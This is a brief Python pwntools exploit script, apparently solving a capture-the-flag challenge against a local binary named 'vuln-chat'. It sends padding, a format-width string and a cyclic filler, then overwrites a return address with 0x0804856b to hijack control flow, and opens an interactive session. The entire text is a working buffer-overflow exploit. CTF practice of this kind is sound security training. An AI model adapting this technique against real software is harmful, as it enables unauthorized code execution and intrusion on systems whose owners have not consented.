from pwn import *

pwn = process("./vuln-chat")

buf = b'A' * 20
buf += b'%0100s'
buf += b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaan'
buf += p32(0x0804856b)

pwn.sendline(buf)

pwn.interactive()
